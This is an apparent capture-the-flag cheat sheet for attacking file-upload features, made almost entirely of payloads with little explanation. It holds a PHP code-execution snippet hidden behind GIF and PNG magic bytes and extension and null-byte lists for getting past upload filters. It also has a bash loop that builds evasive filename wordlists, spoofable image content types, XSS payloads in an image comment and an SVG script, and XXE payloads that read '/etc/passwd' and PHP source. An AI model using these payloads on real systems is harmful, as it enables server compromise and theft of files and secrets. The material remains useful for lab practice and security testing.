____
`GIF8`
```
PNG

   
IHDR   á   á   	<?php echo file_get_contents('/flag.txt'); ?>
```
PHP extensions

```
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

Web extensions
```
.asp
.aspx
.bat
.c
.cfm
.cgi
.css
.com
.dll
.exe
.hta
.htm
.html
.inc
.jhtml
.js
.jsa
.jsp
.log
.mdb
.nsf
.pcap
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.pht
.phtml
.pl
.phar
.reg
.sh
.shtml
.sql
.swf
.txt
.xml
```

Double extensions
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> filenames_wordlist.txt
        echo "shell$ext$char.jpg" >> filenames_wordlist.txt
        echo "shell.jpg$char$ext" >> filenames_wordlist.txt
        echo "shell.jpg$ext$char" >> filenames_wordlist.txt
    done
done
```

Content types (images)

```
image/vnd.dxf
image/bmp
image/prs.btif
image/vnd.dvb.subtitle
image/x-cmu-raster
image/cgm
image/x-cmx
image/vnd.dece.graphic
image/vnd.djvu
image/vnd.dwg
image/vnd.fujixerox.edmics-mmr
image/vnd.fujixerox.edmics-rlc
image/vnd.xiff
image/vnd.fst
image/vnd.fastbidsheet
image/vnd.fpx
image/vnd.net-fpx
image/x-freehand
image/g3fax
image/gif
image/x-icon
image/ief
image/jpeg
image/x-citrix-jpeg
image/pjpeg
image/vnd.ms-modi
image/ktx
image/x-pcx
image/vnd.adobe.photoshop
image/x-pict
image/x-portable-anymap
image/x-portable-bitmap
image/x-portable-graymap
image/png
image/x-citrix-png
image/x-png
image/x-portable-pixmap
image/svg+xml
image/x-rgb
image/tiff
image/vnd.wap.wbmp
image/webp
image/x-xbitmap
image/x-xpixmap
image/x-xwindowdum
```

# XSS

SVG images

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

# XXE

SVG images

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```